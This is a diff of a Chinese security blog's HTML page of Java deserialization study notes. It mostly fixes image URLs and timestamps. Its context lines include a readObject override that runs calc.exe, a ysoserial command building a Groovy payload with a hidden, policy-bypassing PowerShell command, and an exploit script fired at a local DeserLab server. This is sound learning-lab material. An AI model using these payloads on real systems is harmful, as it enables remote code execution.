@@ -14,16 +14,16 @@
 <meta property="og:site_name" content="Sec-note">
 <meta property="og:description" content="Java 反序列化学习记录笔记，持续学习研究。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-3/97255792.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/15517531.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/79586731.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/97971690.jpg">
-<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/52073188.jpg">
-<meta property="og:updated_time" content="2018-12-11T12:38:53.093Z">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-3/97255792.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/15517531.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/79586731.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/97971690.jpg">
+<meta property="og:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/52073188.jpg">
+<meta property="og:updated_time" content="2018-12-12T01:32:55.476Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Java 反序列化">
 <meta name="twitter:description" content="Java 反序列化学习记录笔记，持续学习研究。">
-<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-3/97255792.jpg">
+<meta name="twitter:image" content="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-3/97255792.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Sec-note" type="application/atom+xml">
   
@@ -211,7 +211,7 @@ name=sec-note,age=26,sex=男
             //执行命令
             Runtime.getRuntime().exec(&quot;calc.exe&quot;);
         }
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-3/97255792.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-3/97255792.jpg" alt=""></p>
 <p>在<code>Person</code>类中重写了<code>readObject</code>方法，然后反序列化的时候，调用该方法，执行了相应的<code>payload</code>。</p>
 <p>反序列化，其中的内置方法被重写。</p>
 <h4 id="反序列化漏洞源头"><a href="#反序列化漏洞源头" class="headerlink" title="反序列化漏洞源头"></a>反序列化漏洞源头</h4><p><strong>开发失误</strong></p>
@@ -248,18 +248,18 @@ JSON.parseObject
 <h5 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h5><p>可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。</p>
 <h4 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h4><h5 id="DeserLab演示"><a href="#DeserLab演示" class="headerlink" title="DeserLab演示"></a><a href="https://github.com/NickstaDB/DeserLab" target="_blank" rel="noopener">DeserLab演示</a></h5><p><a href="https://github.com/NickstaDB/DeserLab" target="_blank" rel="noopener">DeserLab演示</a>是一个使用了<code>Groovy</code>库的简单网络协议应用，实现<code>client</code>和<code>server</code>端发送序列化数据的功能，该库和<code>Apache Commons Collection</code>库一样，含有可利用的POP链。</p>
 <p><a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">生成有效载荷</a></p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/15517531.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/15517531.jpg" alt=""></p>
 <p>用ysoserial生成针对Groovy库的payload</p>
 <pre><code>E:\Download&gt;java -jar ysoserial-master.jar  Groovy1 &quot;powershell.exe -NonI -W Hid
 den -NoP -Exec Bypass -Enc bQBrAGQAaQByACAAcwBlAGMAXwBuAG8AdABlAA==&quot; &gt; payload2.
 bin
 </code></pre><p>在DeserLab的Github项目页面下载DeserLab.jar<br>命令行下使用<code>java -jar DeserLab.jar -server 127.0.0.1 6666</code>开启本地服务端。</p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/79586731.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/79586731.jpg" alt=""></p>
 <p>使用<a href="https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7" target="_blank" rel="noopener">deserlab_exploit.py</a>脚本执行<code>payload</code>。</p>
 <pre><code>python deserlab_exploit.py 127.0.0.1 6666 payload2.bin
-</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/97971690.jpg" alt=""></p>
+</code></pre><p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/97971690.jpg" alt=""></p>
 <p>成功写入一个新文件，命令执行。</p>
-<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu//18-4-8/52073188.jpg" alt=""></p>
+<p><img src="https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-8/52073188.jpg" alt=""></p>
 <h3 id="深入理解-JAVA-反序列化漏洞"><a href="#深入理解-JAVA-反序列化漏洞" class="headerlink" title="深入理解 JAVA 反序列化漏洞"></a><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></h3><h4 id="反序列化和序列化的使用场景"><a href="#反序列化和序列化的使用场景" class="headerlink" title="反序列化和序列化的使用场景"></a>反序列化和序列化的使用场景</h4><p>有效的实现多平台之间的通信、对象持久化存储。</p>
 <blockquote>
 <p>HTTP：多平台之间的通信，管理等</p>
@@ -280,7 +280,7 @@ bin
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/08/java_发序列化/" data-id="cjpjt0n67004c4dxd0s04mb6f" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/04/08/java_发序列化/" data-id="cjpki3m8a0049wgxdzw2l3a85" class="article-share-link">Share</a>
       
       
     </footer>
